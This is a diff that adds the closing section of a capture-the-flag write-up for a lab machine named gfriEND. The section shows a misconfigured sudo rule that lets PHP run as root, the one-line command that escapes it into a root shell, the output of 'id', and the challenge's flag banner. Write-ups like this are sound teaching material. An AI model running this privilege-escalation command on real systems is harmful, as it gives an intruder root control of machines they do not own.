@@ -129,7 +129,32 @@ User alice may run the following commands on gfriEND:
     (root) NOPASSWD: /usr/bin/php
 ```
 
+we can run php on the system with root permissions, so try to use the command below :
 
+```bash
+alice@gfriEND:~$ sudo /usr/bin/php -r "system('/bin/bash');"
+root@gfriEND:~# id
+uid=0(root) gid=0(root) groups=0(root)
 
+root@gfriEND:~# cd /root
 
+root@gfriEND:/root# cat flag2.txt 
+
+  ________        __    ___________.__             ___________.__                ._.
+ /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
+/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
+\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
+ \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
+        \/                              \/     \/       \/              \//_____/ \/
+
+Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)
+
+Contact me if you want to contribute / give me feedback / share your writeup!
+Twitter: @makegreatagain_
+Instagram: @aldodimas73
+
+Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
+```
+
+This is how you can get root on the this machine :)
 
